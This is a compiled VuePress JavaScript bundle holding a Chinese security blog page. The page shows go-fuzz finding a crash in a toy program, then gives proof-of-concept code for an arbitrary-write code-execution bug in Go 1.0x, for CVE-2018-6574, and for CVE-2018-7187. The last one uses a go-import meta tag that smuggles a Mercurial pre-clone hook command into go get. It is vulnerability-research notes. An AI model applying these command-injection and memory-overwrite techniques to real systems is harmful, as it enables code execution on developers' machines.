(window.webpackJsonp=window.webpackJsonp||[]).push([[30],{354:function(t,e,n){"use strict";n.r(e);var a=n(1),s=Object(a.a)({},function(){this.$createElement;this._self._c;return this._m(0)},[function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("div",{staticClass:"content"},[n("h2",{attrs:{id:"_0x1-fuzz"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_0x1-fuzz","aria-hidden":"true"}},[t._v("#")]),t._v(" 0x1 fuzz")]),t._v(" "),n("p",[t._v("go fuzz 项目 https://github.com/dvyukov/go-fuzz/")]),t._v(" "),n("p",[t._v("测试代码")]),t._v(" "),n("p",[t._v("fuzz.go")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[t._v("package test\n\nfunc Fuzz(data []byte) int {\n\ttmp(data)\n\treturn 0\n}\n")])])]),n("p",[t._v("test.go")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[t._v('package test\n\nimport(\n"fmt"\n)\n\nfunc main(){\n    //var tmpx []byte\n    tmpx := []byte("0000")\n    tmp(tmpx)\n}\n\nfunc tmp(tmp []byte) int{\n    arr1 := tmp\n    if len(arr1) < 5{\n\t\tfmt.Println("hello world")\n        return 0\n    }\n    fmt.Println(arr1[100])\n    return 1\n}\n\n')])])]),n("p",[t._v("./go-fuzz-build github.com/test")]),t._v(" "),n("p",[t._v("./go-fuzz -bin=./test-fuzz.zip -workdir=test")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[t._v("2018/05/03 21:08:09 workers: 4, corpus: 1 (3s ago), crashers: 1, restarts: 1/0, execs: 0 (0/sec), cover: 0, uptime: 3s\n2018/05/03 21:08:12 workers: 4, corpus: 1 (6s ago), crashers: 1, restarts: 1/0, execs: 0 (0/sec), cover: 90, uptime: 6s\n")])])]),n("p",[t._v("cat crashers/6934105ad50010b814c933314b1da6841431bc8b.output")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[t._v("panic: runtime error: index out of range\n\ngoroutine 1 [running]:\ngithub.com/test.tmp(0x1214000, 0x5, 0x200000, 0x5d232)\n\t/var/folders/xk/jc5ln51j2y91n3kvymwtfwsw0000gn/T/go-fuzz-build211162217/gopath/src/github.com/test/test.go:19 +0x165\ngithub.com/test.Fuzz(0x1214000, 0x5, 0x200000, 0xc42003df70)\n\t/var/folders/xk/jc5ln51j2y91n3kvymwtfwsw0000gn/T/go-fuzz-build211162217/gopath/src/github.com/test/fuzz.go:5 +0x57\ngo-fuzz-dep.Main(0x10e3c98)\n\t/var/folders/xk/jc5ln51j2y91n3kvymwtfwsw0000gn/T/go-fuzz-build211162217/goroot/src/go-fuzz-dep/main.go:49 +0xad\nmain.main()\n\t/var/folders/xk/jc5ln51j2y91n3kvymwtfwsw0000gn/T/go-fuzz-build211162217/gopath/src/github.com/test/go.fuzz.main/main.go:10 +0x2d\n")])])]),n("p",[t._v("测试完gofuzz，由此联想到在golang中是否存在类似c/c++可利用的漏洞，google一下。")]),t._v(" "),n("p",[t._v("找到一种在go1.0x中代码执行的办法，已经在go1.1以后的版本修复，暂时记录一波。还有两个2018年golang代码执行。")]),t._v(" "),n("h2",{attrs:{id:"_0x2-arbitrary-write-and-code-execution-in-go1-0x"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_0x2-arbitrary-write-and-code-execution-in-go1-0x","aria-hidden":"true"}},[t._v("#")]),t._v(" 0x2 arbitrary write and code execution in go1.0x")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[t._v('package main\n\nimport "fmt"\n\n// Address to write, computed from a previous run.\nconst addr_to_overwrite = 0x50e2f0\n// &shellcode, computed from a previous run.\nconst val_to_overwrite uint64 = 0xc200035160\n\ntype Embedded struct {\n   offset [addr_to_overwrite]byte\n   payload uint64\n}\n\ntype Nested struct {\n  // This magic is necessary is because there is an explict null check if\n  // if the offset is greater than 0x1000.\n  Embedded\n}\n\ntype Struct struct {\n // The issue is that a reference to the embeded struct pointer here\n // will be offset from null (rather than the true base of the struct).\n // We thus just make sizeof(the embedded struct) large enough to point\n // to the address we want to overwrite.\n //\n // See https://code.google.com/p/go/issues/detail?id=5336\n *Nested\n}\n\nvar unused = func () {}\n\nfunc main() {\n s := &Struct{}\n shellcode := "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\xeb\\xfe"\n\n fmt.Println("You should overwrite this: ", &unused)\n fmt.Println("With this: ", &shellcode)\n\n fmt.Println("***********************************************");\n fmt.Println("Overwriting ", &s.payload, " with ", val_to_overwrite)\n\n *(&s.payload) = val_to_overwrite;\n\n unused();\n}\n')])])]),n("h2",{attrs:{id:"_0x3-golang-code-exec"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_0x3-golang-code-exec","aria-hidden":"true"}},[t._v("#")]),t._v(" 0x3 golang code exec")]),t._v(" "),n("p",[t._v("###1 cve-2018-6574")]),t._v(" "),n("p",[t._v("poc: test.go")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[t._v('package main\n/*\n#include <stdio.h>\n#include <stdlib.h>\nvoid my_print(char *str){\n    printf("%s\\n",str);\n}\n*/\nimport "C"\nimport "unsafe"\nimport "fmt"\nfunc main() {\n  fmt.Println("Hello, World!")\n  s:="-----------------------------run by c"\n  cs:=C.CString(s)\n  C.my_print(cs)\n  C.free(unsafe.Pointer(cs))\n}\n')])])]),n("p",[t._v("go run test.go")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[t._v("go run test.go\nHello, World!\n-----------------------------run by c\n")])])]),n("p",[t._v("###2 CVE-2018-7187")]),t._v(" "),n("p",[t._v("poc: go-vuln/index.html")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[t._v('<meta name="go-import" content="justfan.com/go-vuln hg --config=hooks.pre-clone=whoami;https://">\n')])])]),n("p",[t._v("fan@fan:~/go$ go get -insecure justfan.com/go-vuln")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[t._v("# cd .; hg clone -U --config=hooks.pre-clone=whoami;https:// /home/fan/go/src/justfan.com/go-vuln\nfan\n/bin/sh: 1: https://: not found\nabort: pre-clone hook exited with status 127\npackage justfan.com/go-vuln: exit status 255\n")])])]),n("p",[t._v("正常协议")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[t._v('<meta name="go-import" content="justfan.com/go-vuln hg https://www.mercurial-scm.org/repo/hello">\n')])])]),n("p",[t._v("参数")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[t._v(">-insecure\n\n>>The -insecure flag permits fetching from repositories and resolving\ncustom domains using insecure schemes such as HTTP. Use with caution.\n\n>-config=hooks.pre-clone \n\n>> hg clone --config=hooks.pre-clone=whoami https://www.mercurial-scm.org/repo/hello\n \n>>>-pre-command\n>>>>Run before executing the associated command. The contents of the command line are passed as $HG_ARGS. Parsed command line arguments are passed as $HG_PATS and\n$HG_OPTS. These contain string representations of the data internally passed to <command>. $HG_OPTS is a dictionary of options (with unspecified options set to their defaults). $HG_PATS is a list of arguments. If the hook returns failure, the command doesn't execute and Mercurial returns the failure code.\n")])])])])}],!1,null,null,null);e.default=s.exports}}]);